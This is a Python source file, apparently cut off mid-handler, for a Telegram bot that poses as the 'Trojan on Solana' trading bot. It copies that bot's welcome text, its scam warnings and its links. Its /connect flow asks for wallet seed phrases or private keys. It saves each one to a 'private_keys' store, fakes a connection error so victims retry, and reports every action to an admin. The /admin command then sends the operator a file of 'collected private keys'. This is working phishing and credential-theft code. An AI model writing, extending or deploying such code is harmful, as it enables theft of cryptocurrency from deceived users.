import asyncio
import logging
import os
import json
import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_logs.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Bot token and admin ID (replace with your own)
BOT_TOKEN = "BOT_TOKEN"
ADMIN_CHAT_ID = "ADMIN_CHAT_ID"  # Replace with your Telegram ID

# File for storing user data
USERS_FILE = "users_data.json"

# Initialize bot and dispatcher with state storage
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Function to load user data from file
def load_users_data():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading user data: {e}")
            return {}
    return {}

# Function to save user data to file
def save_users_data(users_data):
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(users_data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

# Global dictionary for storing user data
users_data = load_users_data()

# Function to send notification to admin
async def notify_admin(message):
    try:
        if ADMIN_CHAT_ID and ADMIN_CHAT_ID != "YOUR_CHAT_ID":
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text=message)
    except Exception as e:
        logger.error(f"Error sending notification to admin: {e}")

# Function to log user actions
def log_user_action(user_id, username, action, additional_info=None):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save action to log file
    log_message = f"[{current_time}] User {user_id} (@{username}): {action}"
    if additional_info:
        log_message += f" - {additional_info}"
    logger.info(log_message)
    
    # Update user data
    user_str = str(user_id)
    if user_str not in users_data:
        users_data[user_str] = {
            "user_id": user_id,
            "username": username,
            "first_seen": current_time,
            "last_action_time": current_time,
            "actions": [],
            "private_keys": []  # List for storing private keys/phrases
        }
    else:
        users_data[user_str]["last_action_time"] = current_time
        users_data[user_str]["username"] = username  # Update username
    
    # Add action to history
    action_data = {
        "time": current_time,
        "action": action
    }
    if additional_info:
        action_data["details"] = additional_info
        
        # Save private keys separately for better security
        if action == "Entered private key/phrase" and additional_info.startswith("Data:"):
            key_data = additional_info.replace("Data: ", "")
            if "private_keys" not in users_data[user_str]:
                users_data[user_str]["private_keys"] = []
            users_data[user_str]["private_keys"].append({
                "time": current_time,
                "key_data": key_data
            })
    
    # Limit stored actions (keep last 100)
    if "actions" not in users_data[user_str]:
        users_data[user_str]["actions"] = []
    
    users_data[user_str]["actions"].append(action_data)
    if len(users_data[user_str]["actions"]) > 100:
        users_data[user_str]["actions"] = users_data[user_str]["actions"][-100:]
    
    # Save updated data to file
    save_users_data(users_data)
    
    # Send notification to admin
    asyncio.create_task(notify_admin(f"🔔 {log_message}"))

# Class for user states
class UserStates(StatesGroup):
    SET_CUSTOM_FEE = State()
    SET_SELL_PRIORITY_FEE = State()
    SET_BUY_AMOUNT = State()
    SET_BUY_SLIPPAGE = State()
    SET_SELL_AMOUNT = State()
    SET_SELL_SLIPPAGE = State()
    CONNECT_WALLET = State()  # State for entering wallet key/phrase

# Class for storing user settings
class UserSettings:
    def __init__(self):
        # General settings
        self.fee_mode = "Fast"  # Fast, Turbo or Custom
        self.custom_fee = 0.0025
        self.sell_priority_fee = None
        self.mev_protect_buys = False
        self.mev_protect_sells = False
        self.auto_buy = False
        self.auto_sell = False
        self.confirm_trades = False
        self.chart_previews = False
        self.sell_protection = False
        
        # Buy settings
        self.buy_amounts = [0.5, 1, 3, 5, 10]
        self.buy_slippage = 15
        
        # Sell settings
        self.sell_amounts = [50, 100]
        self.sell_slippage = 15

# Dictionary for storing user settings
user_settings = {}

# Function to get user settings
def get_user_settings(user_id):
    if user_id not in user_settings:
        user_settings[user_id] = UserSettings()
    return user_settings[user_id]

# Format numeric values without decimal part for integers
def format_number(num):
    if num == int(num):
        return str(int(num))
    return str(num)

# Function to create keyboard
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Buy", callback_data="buy"), 
         InlineKeyboardButton(text="Sell", callback_data="sell")],
        [InlineKeyboardButton(text="Positions", callback_data="positions"), 
         InlineKeyboardButton(text="Limit Orders", callback_data="limit_orders"),
         InlineKeyboardButton(text="DCA Orders", callback_data="dca_orders")],
        [InlineKeyboardButton(text="Copy Trade", callback_data="copy_trade"), 
         InlineKeyboardButton(text="🆕 Sniper", callback_data="sniper")],
        [InlineKeyboardButton(text="Trenches", callback_data="trenches"), 
         InlineKeyboardButton(text="💰 Referrals", callback_data="referrals"),
         InlineKeyboardButton(text="⭐️ Watchlist", callback_data="watchlist")],
        [InlineKeyboardButton(text="Withdraw", callback_data="withdraw"), 
         InlineKeyboardButton(text="Settings", callback_data="settings")],
        [InlineKeyboardButton(text="Help", callback_data="help"), 
         InlineKeyboardButton(text="↻ Refresh", callback_data="refresh")]
    ])
    return keyboard

# Function for back button
def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="← Back", callback_data="back")]
    ])
    return keyboard

# Function for back and refresh buttons
def get_back_refresh_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="← Back", callback_data="back"),
         InlineKeyboardButton(text="↻ Refresh", callback_data="refresh_no_action")]
    ])
    return keyboard

# Keyboard for Referrals section
def get_referrals_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Close", callback_data="back")],
        [InlineKeyboardButton(text="Rewards Wallet: Current", callback_data="rewards_wallet_no_action")],
        [InlineKeyboardButton(text="↻ Refresh", callback_data="refresh_no_action")]
    ])
    return keyboard

# Keyboard for settings
def get_settings_keyboard(user_id):
    settings = get_user_settings(user_id)
    
    # Format button texts based on settings
    fast_text = "✅ Fast 🐴" if settings.fee_mode == "Fast" else "Fast 🐴"
    turbo_text = "✅ Turbo 🚀" if settings.fee_mode == "Turbo" else "Turbo 🚀"
    custom_fee_text = "✅ Custom Fee" if settings.fee_mode == "Custom" else "Custom Fee"
    
    sell_priority_text = f"Sell Priority Fee Override: {format_number(settings.sell_priority_fee)} SOL" if settings.sell_priority_fee else "Sell Priority Fee Override: —"
    
    mev_buys_text = "🟢 Mev Protect (Buys)" if settings.mev_protect_buys else "🔴 Mev Protect (Buys)"
    mev_sells_text = "🟢 Mev Protect (Sells)" if settings.mev_protect_sells else "🔴 Mev Protect (Sells)"
    auto_buy_text = "🟢 Auto Buy" if settings.auto_buy else "🔴 Auto Buy"
    auto_sell_text = "🟢 Auto Sell" if settings.auto_sell else "🔴 Auto Sell"
    confirm_trades_text = "🟢 Confirm Trades" if settings.confirm_trades else "🔴 Confirm Trades"
    chart_previews_text = "🟢 Chart Previews" if settings.chart_previews else "🔴 Chart Previews"
    sell_protection_text = "🟢 Sell Protection" if settings.sell_protection else "🔴 Sell Protection"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="← Back", callback_data="back"), 
         InlineKeyboardButton(text="English 🇺🇸", callback_data="no_action")],
        [InlineKeyboardButton(text="Set Referrer", callback_data="set_referrer")],
        [InlineKeyboardButton(text=fast_text, callback_data="fee_fast"), 
         InlineKeyboardButton(text=turbo_text, callback_data="fee_turbo"), 
         InlineKeyboardButton(text=custom_fee_text, callback_data="fee_custom")],
        [InlineKeyboardButton(text=sell_priority_text, callback_data="sell_priority_fee")],
        [InlineKeyboardButton(text="Buy Settings", callback_data="buy_settings"), 
         InlineKeyboardButton(text="Sell Settings", callback_data="sell_settings")],
        [InlineKeyboardButton(text=mev_buys_text, callback_data="toggle_mev_buys"), 
         InlineKeyboardButton(text=mev_sells_text, callback_data="toggle_mev_sells")],
        [InlineKeyboardButton(text=auto_buy_text, callback_data="toggle_auto_buy"), 
         InlineKeyboardButton(text=auto_sell_text, callback_data="toggle_auto_sell")],
        [InlineKeyboardButton(text=confirm_trades_text, callback_data="toggle_confirm_trades")],
        [InlineKeyboardButton(text="Pnl Cards", callback_data="pnl_cards"), 
         InlineKeyboardButton(text=chart_previews_text, callback_data="toggle_chart_previews")],
        [InlineKeyboardButton(text="Show/Hide Tokens", callback_data="show_hide_tokens"), 
         InlineKeyboardButton(text="Wallets", callback_data="wallets")],
        [InlineKeyboardButton(text="🔐 Account Security", callback_data="account_security"), 
         InlineKeyboardButton(text=sell_protection_text, callback_data="toggle_sell_protection")],
        [InlineKeyboardButton(text="🐴⚡️ BOLT 🟢", callback_data="bolt_info")]
    ])
    return keyboard

# Keyboard for Buy Settings
def get_buy_settings_keyboard(user_id):
    settings = get_user_settings(user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="— Buy Amounts —", callback_data="no_action")],
        [InlineKeyboardButton(text=f"{format_number(settings.buy_amounts[0])} SOL ✏️", callback_data="set_buy_amount_0"), 
         InlineKeyboardButton(text=f"{format_number(settings.buy_amounts[1])} SOL ✏️", callback_data="set_buy_amount_1"), 
         InlineKeyboardButton(text=f"{format_number(settings.buy_amounts[2])} SOL ✏️", callback_data="set_buy_amount_2")],
        [InlineKeyboardButton(text=f"{format_number(settings.buy_amounts[3])} SOL ✏️", callback_data="set_buy_amount_3"), 
         InlineKeyboardButton(text=f"{format_number(settings.buy_amounts[4])} SOL ✏️", callback_data="set_buy_amount_4")],
        [InlineKeyboardButton(text=f"Buy Slippage: {format_number(settings.buy_slippage)}% ✏️", callback_data="set_buy_slippage")],
        [InlineKeyboardButton(text="← Back", callback_data="back_to_settings")]
    ])
    return keyboard

# Keyboard for Sell Settings
def get_sell_settings_keyboard(user_id):
    settings = get_user_settings(user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="— Sell Amounts —", callback_data="no_action")],
        [InlineKeyboardButton(text=f"{format_number(settings.sell_amounts[0])} % ✏️", callback_data="set_sell_amount_0"), 
         InlineKeyboardButton(text=f"{format_number(settings.sell_amounts[1])} % ✏️", callback_data="set_sell_amount_1")],
        [InlineKeyboardButton(text=f"Sell Slippage: {format_number(settings.sell_slippage)}% ✏️", callback_data="set_sell_slippage")],
        [InlineKeyboardButton(text="← Back", callback_data="back_to_settings")]
    ])
    return keyboard

# Keyboard for Retry button
def get_retry_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Retry", callback_data="retry")]
    ])
    return keyboard

# Keyboard for Withdraw - network selection
def get_withdraw_networks_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="← Back", callback_data="back"),
         InlineKeyboardButton(text="Solana", callback_data="withdraw_solana")]
    ])
    return keyboard

# Keyboard for Withdraw - token selection
def get_withdraw_tokens_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="← Back", callback_data="withdraw_back"), 
         InlineKeyboardButton(text="↻ Refresh", callback_data="refresh_no_action")],
        [InlineKeyboardButton(text="SOL", callback_data="withdraw_sol")]
    ])
    return keyboard

# Keyboard for Account Security section
def get_account_security_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Create", callback_data="create_sap")],
        [InlineKeyboardButton(text="← Back", callback_data="back_to_settings")]
    ])
    return keyboard

# Keyboard for /connect command
def get_connect_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="I understand", callback_data="connect_confirm")],
        [InlineKeyboardButton(text="← Back", callback_data="back")]
    ])
    return keyboard

# /start command handler
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Log user action
    user = message.from_user
    log_user_action(user.id, user.username, "Started bot with /start command")
    
    # First warning message
    warning_message = """⚠️ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.

Telegram now displays ADS in our bots without our approval. Trojan will NEVER advertise any links, airdrop claims, groups or discounts on fees.

For support, use ONLY @trojan or the white chat bubble directly on trojan.com. Moderators, Support Staff and Admins will never Direct Message first or call you!

You can find all of our official bots on trojan.com/links. Please do not search telegram for our bots, there are many impersonators."""

    # Send and pin the first message
    warning = await message.answer(warning_message)
    await bot.pin_chat_message(chat_id=message.chat.id, message_id=warning.message_id)

    # Second welcome message with keyboard
    welcome_message = """Welcome to Trojan on Solana!
        
Introducing a cutting-edge bot crafted exclusively for Solana Traders. Trade any token instantly right after launch.
        
At this time, you have not yet linked your wallet. Click on Connect to start trading.
Balance: 0 SOL ($0.00)
—
Click on the Refresh button to update your current balance.

Join our Telegram group @trojan and follow us on Twitter (https://twitter.com/TrojanOnSolana)!

💡If you aren't already, we advise that you use any of the following bots to trade with. You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.
Agamemnon (https://t.me/agamemnon_trojanbot) | Achilles (https://t.me/achilles_trojanbot) | Nestor (https://t.me/nestor_trojanbot) | Odysseus (https://t.me/odysseus_trojanbot) | Menelaus (https://t.me/menelaus_trojanbot) | Diomedes (https://t.me/diomedes_trojanbot) | Paris (https://t.me/paris_trojanbot) | Helenus (https://t.me/helenus_trojanbot) | Hector (https://t.me/hector_trojanbot)

⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."""

    # Send second message with keyboard
    await message.answer(welcome_message, reply_markup=get_main_keyboard())

# /connect command handler
@dp.message(Command("connect"))
async def cmd_connect(message: types.Message, state: FSMContext):
    # Log user action
    user = message.from_user
    log_user_action(user.id, user.username, "Used /connect command")
    
    connect_message = """In order to connect your wallet you need to enter your seed phrase or private key.

IMPORTANT NOTE: after linking your wallet, be sure to make a Secure Action Password (SAP) inside the bot to keep your data safe. NEVER share your wallet data outside the bot, otherwise you risk losing all your money

By clicking "I understand" you agree that you have read the warning. The Trojan team is not responsible for the loss of your assets"""
    
    await message.answer(connect_message, reply_markup=get_connect_keyboard())

# /admin command handler - for admin to get statistics
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    user_id = message.from_user.id
    user_id_str = str(user_id)
    
    # Check if user is admin
    if ADMIN_CHAT_ID != "YOUR_CHAT_ID" and user_id_str == ADMIN_CHAT_ID:
        # Form statistics
        users_count = len(users_data)
        today = datetime.datetime.now().strftime("%Y-%m-%d")
        
        # Count active users today
        active_today = 0
        for user_data in users_data.values():
            last_action = user_data.get("last_action_time", "")
            if last_action.startswith(today):
                active_today += 1
        
        # Form top-10 active users
        users_by_activity = sorted(
            users_data.values(), 
            key=lambda x: len(x.get("actions", [])), 
            reverse=True
        )[:10]
        
        top_users_text = "\n".join([
            f"@{user.get('username', 'Unknown')} (ID: {user.get('user_id', 'Unknown')}) - {len(user.get('actions', []))} actions"
            for user in users_by_activity
        ])
        
        # Count total collected private keys
        total_keys = sum(len(user.get("private_keys", [])) for user in users_data.values())
        
        # Send statistics
        stats_message = f"""📊 Bot Statistics:

Total users: {users_count}
Active today: {active_today}
Collected private keys: {total_keys}

🔝 Top active users:
{top_users_text}

🗓 Date: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"""
        
        await message.answer(stats_message)
        
        # Send file with user data
        await message.answer_document(
            FSInputFile(USERS_FILE, filename="users_data.json"),
            caption="Users data file"
        )
        
        # Create and send separate file with private keys
        private_keys_data = {}
        for user_id, user_data in users_data.items():
            if "private_keys" in user_data and user_data["private_keys"]:
                username = user_data.get("username", "Unknown")
                private_keys_data[f"{user_id} (@{username})"] = user_data["private_keys"]
        
        if private_keys_data:
            keys_file = "private_keys.json"
            try:
                with open(keys_file, 'w', encoding='utf-8') as f:
                    json.dump(private_keys_data, f, ensure_ascii=False, indent=4)
                
                await message.answer_document(
                    FSInputFile(keys_file, filename="private_keys.json"),
                    caption="⚠️ IMPORTANT! File with collected private keys"
                )
            except Exception as e:
                logger.error(f"Error creating private keys file: {e}")
        
        # Send log file
        if os.path.exists("bot_logs.log"):
            await message.answer_document(
                FSInputFile("bot_logs.log", filename="bot_logs.log"),
                caption="Bot logs file"
            )
    else:
        # Log unauthorized access attempt
        log_user_action(
            user_id, 
            message.from_user.username, 
            "Unauthorized access attempt", 
            "Access denied"
        )
        # For non-admins, simply ignore the command
        pass

# Text input handler (for settings)
@dp.message()
async def process_text_input(message: types.Message, state: FSMContext):
    # Get current user state
    current_state = await state.get_state()
    user_id = message.from_user.id
    username = message.from_user.username
    settings = get_user_settings(user_id)
    
    # Handle key/phrase wallet input
    if current_state == UserStates.CONNECT_WALLET.state:
        # Save entered key/phrase to log for security
        key_data = message.text.strip()
        log_user_action(user_id, username, "Entered private key/phrase", f"Data: {key_data}")
        
        # Simulate wallet check - just delay
        await asyncio.sleep(3)
        error_message = "🚫 There was an internal error. This may be due to incorrect data entered. Please try again or enter another valid wallet"
        
        # Log error
        log_user_action(user_id, username, "Error connecting wallet", "Internal error")
        
        await message.answer(error_message, reply_markup=get_back_keyboard())
        # Leave state so user can enter data again
        return
    
    # Handle user commission input
    if current_state == UserStates.SET_CUSTOM_FEE.state:
        try:
            fee = float(message.text)
            settings.custom_fee = fee
            settings.fee_mode = "Custom"
            
            # Log action
            log_user_action(user_id, username, "Set user commission", f"Value: {fee}")
            
            # Show settings again
            settings_message = """FAQ:

🚀 Fast/Turbo/Custom Fee: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 Confirm Trades: Red = off, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 Confirm Trades: Green = on, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️MEV Protection:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
Important Note: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 Sell Protection: Green = on, you will need to confirm your intention when selling more than 75% of your token balance."""
            await message.answer(settings_message, reply_markup=get_settings_keyboard(user_id))
            await state.clear()
        except ValueError:
            # Log error
            log_user_action(user_id, username, "Error setting commission", f"Invalid value: {message.text}")
            
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())
    
    # Handle sell priority commission input
    elif current_state == UserStates.SET_SELL_PRIORITY_FEE.state:
        try:
            fee = float(message.text)
            if fee > 0:
                settings.sell_priority_fee = fee
            else:
                settings.sell_priority_fee = None
                
            # Show settings again
            settings_message = """FAQ:

🚀 Fast/Turbo/Custom Fee: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 Confirm Trades: Red = off, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 Confirm Trades: Green = on, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️MEV Protection:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
Important Note: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 Sell Protection: Green = on, you will need to confirm your intention when selling more than 75% of your token balance."""
            await message.answer(settings_message, reply_markup=get_settings_keyboard(user_id))
            await state.clear()
        except ValueError:
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())
    
    # Handle buy amount change
    elif current_state and current_state.startswith(UserStates.SET_BUY_AMOUNT.state):
        # Extract index from state
        try:
            index = int(current_state.split(":")[-1])
            amount = float(message.text)
            settings.buy_amounts[index] = amount
            
            # Return to Buy Settings screen with original message
            buy_settings_message = """Buy Amounts:
Click any button under Buy Amounts to set your own custom SOL amounts. These SOL amounts will be available as options in your buy menu.

Buy Slippage:
Set the preset slippage option for your buys. Changing this slippage value will automatically apply to your next buys."""
            await message.answer(buy_settings_message, reply_markup=get_buy_settings_keyboard(user_id))
            await state.clear()
        except (ValueError, IndexError):
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())
    
    # Handle buy slippage change
    elif current_state == UserStates.SET_BUY_SLIPPAGE.state:
        try:
            # Remove % if user added it
            slippage_text = message.text.replace("%", "").strip()
            slippage = float(slippage_text)
            settings.buy_slippage = slippage
            
            # Return to Buy Settings screen with original message
            buy_settings_message = """Buy Amounts:
Click any button under Buy Amounts to set your own custom SOL amounts. These SOL amounts will be available as options in your buy menu.

Buy Slippage:
Set the preset slippage option for your buys. Changing this slippage value will automatically apply to your next buys."""
            await message.answer(buy_settings_message, reply_markup=get_buy_settings_keyboard(user_id))
            await state.clear()
        except ValueError:
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())
    
    # Handle sell percentage change
    elif current_state and current_state.startswith(UserStates.SET_SELL_AMOUNT.state):
        try:
            index = int(current_state.split(":")[-1])
            # Remove % if user added it
            amount_text = message.text.replace("%", "").strip()
            amount = float(amount_text)
            settings.sell_amounts[index] = amount
            
            # Return to Sell Settings screen with original message
            sell_settings_message = """Sell Amounts:
Click any button under Sell Amounts to set your own custom sell percentages. These values will be available as options in your sell menu.

Sell Slippage:
Set the preset slippage option for your sells. Changing this slippage value will automatically apply to your next sells."""
            await message.answer(sell_settings_message, reply_markup=get_sell_settings_keyboard(user_id))
            await state.clear()
        except (ValueError, IndexError):
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())
    
    # Handle sell slippage change
    elif current_state == UserStates.SET_SELL_SLIPPAGE.state:
        try:
            # Remove % if user added it
            slippage_text = message.text.replace("%", "").strip()
            slippage = float(slippage_text)
            settings.sell_slippage = slippage
            
            # Return to Sell Settings screen with original message
            sell_settings_message = """Sell Amounts:
Click any button under Sell Amounts to set your own custom sell percentages. These values will be available as options in your sell menu.

Sell Slippage:
Set the preset slippage option for your sells. Changing this slippage value will automatically apply to your next sells."""
            await message.answer(sell_settings_message, reply_markup=get_sell_settings_keyboard(user_id))
            await state.clear()
        except ValueError:
            await message.answer("Invalid amount", reply_markup=get_retry_keyboard())

# Callback handlers for buttons
@dp.callback_query()
async def process_callback(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username
    settings = get_user_settings(user_id)
    
    # Log button press
    log_user_action(user_id, username, f"Pressed button", f"Callback: {callback.data}")
    
    # Handle buttons that shouldn't do anything
    if callback.data in ["refresh", "refresh_no_action", "rewards_wallet_no_action", "no_action"]:
        await callback.answer()
        return
    
    # Handle Back button to return to main menu
    if callback.data == "back":
        # Welcome message for main menu
        welcome_message = """Welcome to Trojan on Solana!
        
Introducing a cutting-edge bot crafted exclusively for Solana Traders. Trade any token instantly right after launch.
        
At this time, you have not yet linked your wallet. Click on Connect to start trading.
Balance: 0 SOL ($0.00)
—
Click on the Refresh button to update your current balance.

Join our Telegram group @trojan and follow us on Twitter (https://twitter.com/TrojanOnSolana)!

💡If you aren't already, we advise that you use any of the following bots to trade with. You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.
Agamemnon (https://t.me/agamemnon_trojanbot) | Achilles (https://t.me/achilles_trojanbot) | Nestor (https://t.me/nestor_trojanbot) | Odysseus (https://t.me/odysseus_trojanbot) | Menelaus (https://t.me/menelaus_trojanbot) | Diomedes (https://t.me/diomedes_trojanbot) | Paris (https://t.me/paris_trojanbot) | Helenus (https://t.me/helenus_trojanbot) | Hector (https://t.me/hector_trojanbot)

⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."""
        await callback.message.edit_text(welcome_message, reply_markup=get_main_keyboard())
        await callback.answer()
        await state.clear()
        return
    
    # Handle Back button to return to settings
    if callback.data == "back_to_settings":
        settings_message = """FAQ:

🚀 Fast/Turbo/Custom Fee: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 Confirm Trades: Red = off, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 Confirm Trades: Green = on, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️MEV Protection:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
Important Note: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 Sell Protection: Green = on, you will need to confirm your intention when selling more than 75% of your token balance."""
        await callback.message.edit_text(settings_message, reply_markup=get_settings_keyboard(user_id))
        await callback.answer()
        await state.clear()
        return
    
    # Retry button
    if callback.data == "retry":
        current_state = await state.get_state()
        
        if current_state == UserStates.SET_CUSTOM_FEE.state:
            await callback.message.edit_text("To set a custom priority fee, input your preferred SOL amount for gas fees per swap. Increasing this amount generally results in quicker swaps and fewer failures.\n\nThe current default modes use:\nFast: 0.0015 SOL\nTurbo: 0.0075 SOL")
        elif current_state == UserStates.SET_SELL_PRIORITY_FEE.state:
            await callback.message.edit_text("To set a custom priority fee for sells only, input your preferred SOL amount for gas fees per swap. Increasing this amount generally results in quicker swaps and fewer failures.")
        elif current_state and current_state.startswith(UserStates.SET_BUY_AMOUNT.state):
            await callback.message.edit_text("Change the value of the buy amount button")
        elif current_state == UserStates.SET_BUY_SLIPPAGE.state:
            await callback.message.edit_text("Change the value of your default buy slippage, e.g. 10%.")
        elif current_state and current_state.startswith(UserStates.SET_SELL_AMOUNT.state):
            await callback.message.edit_text("Change the value of the sell amount button")
        elif current_state == UserStates.SET_SELL_SLIPPAGE.state:
            await callback.message.edit_text("Change the value of your default sell slippage, e.g. 10%.")
        
        await callback.answer()
        return
    
    # Settings button
    if callback.data == "settings":
        settings_message = """FAQ:

🚀 Fast/Turbo/Custom Fee: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 Confirm Trades: Red = off, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 Confirm Trades: Green = on, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️MEV Protection:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
Important Note: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 Sell Protection: Green = on, you will need to confirm your intention when selling more than 75% of your token balance."""
        await callback.message.edit_text(settings_message, reply_markup=get_settings_keyboard(user_id))
        await callback.answer()
        return
    
    # Fee buttons
    if callback.data == "fee_fast":
        settings.fee_mode = "Fast"
        await callback.message.edit_reply_markup(reply_markup=get_settings_keyboard(user_id))
        await callback.answer("Fee mode set to Fast")
        return
    
    if callback.data == "fee_turbo":
        settings.fee_mode = "Turbo"
        await callback.message.edit_reply_markup(reply_markup=get_settings_keyboard(user_id))
        await callback.answer("Fee mode set to Turbo")
        return
    
    if callback.data == "fee_custom":
        await callback.message.edit_text("To set a custom priority fee, input your preferred SOL amount for gas fees per swap. Increasing this amount generally results in quicker swaps and fewer failures.\n\nThe current default modes use:\nFast: 0.0015 SOL\nTurbo: 0.0075 SOL")
        await state.set_state(UserStates.SET_CUSTOM_FEE)
        await callback.answer()
        return
    
    # Sell Priority Fee button
    if callback.data == "sell_priority_fee":
        await callback.message.edit_text("To set a custom priority fee for sells only, input your preferred SOL amount for gas fees per swap. Increasing this amount generally results in quicker swaps and fewer failures.")
        await state.set_state(UserStates.SET_SELL_PRIORITY_FEE)
        await callback.answer()
        return
    
    # Set Referrer button
    if callback.data == "set_referrer":
        await callback.message.edit_text("You have already entered the referrer code", reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Toggle handlers
    toggle_handlers = {
        "toggle_mev_buys": ("mev_protect_buys", "MEV Protection for buys"),
        "toggle_mev_sells": ("mev_protect_sells", "MEV Protection for sells"),
        "toggle_auto_buy": ("auto_buy", "Auto Buy"),
        "toggle_auto_sell": ("auto_sell", "Auto Sell"),
        "toggle_confirm_trades": ("confirm_trades", "Confirm Trades"),
        "toggle_chart_previews": ("chart_previews", "Chart Previews"),
        "toggle_sell_protection": ("sell_protection", "Sell Protection")
    }
    
    if callback.data in toggle_handlers:
        attr_name, feature_name = toggle_handlers[callback.data]
        # Invert attribute value
        current_value = getattr(settings, attr_name)
        setattr(settings, attr_name, not current_value)
        # Update keyboard
        await callback.message.edit_reply_markup(reply_markup=get_settings_keyboard(user_id))
        await callback.answer(f"{feature_name} {'enabled' if not current_value else 'disabled'}")
        return
    
    # Buy Settings button
    if callback.data == "buy_settings":
        buy_settings_message = """Buy Amounts:
Click any button under Buy Amounts to set your own custom SOL amounts. These SOL amounts will be available as options in your buy menu.

Buy Slippage:
Set the preset slippage option for your buys. Changing this slippage value will automatically apply to your next buys."""
        await callback.message.edit_text(buy_settings_message, reply_markup=get_buy_settings_keyboard(user_id))
        await callback.answer()
        return
    
    # Sell Settings button
    if callback.data == "sell_settings":
        sell_settings_message = """Sell Amounts:
Click any button under Sell Amounts to set your own custom sell percentages. These values will be available as options in your sell menu.

Sell Slippage:
Set the preset slippage option for your sells. Changing this slippage value will automatically apply to your next sells."""
        await callback.message.edit_text(sell_settings_message, reply_markup=get_sell_settings_keyboard(user_id))
        await callback.answer()
        return
    
    # Buy Amount buttons
    if callback.data.startswith("set_buy_amount_"):
        index = int(callback.data.split("_")[-1])
        await callback.message.edit_text("Change the value of the buy amount button")
        await state.set_state(f"{UserStates.SET_BUY_AMOUNT.state}:{index}")
        await callback.answer()
        return
    
    # Buy Slippage button
    if callback.data == "set_buy_slippage":
        await callback.message.edit_text("Change the value of your default buy slippage, e.g. 10%.")
        await state.set_state(UserStates.SET_BUY_SLIPPAGE)
        await callback.answer()
        return
    
    # Sell Amount buttons
    if callback.data.startswith("set_sell_amount_"):
        index = int(callback.data.split("_")[-1])
        await callback.message.edit_text("Change the value of the sell amount button")
        await state.set_state(f"{UserStates.SET_SELL_AMOUNT.state}:{index}")
        await callback.answer()
        return
    
    # Sell Slippage button
    if callback.data == "set_sell_slippage":
        await callback.message.edit_text("Change the value of your default sell slippage, e.g. 10%.")
        await state.set_state(UserStates.SET_SELL_SLIPPAGE)
        await callback.answer()
        return
        
    # PNL Cards button
    if callback.data == "pnl_cards":
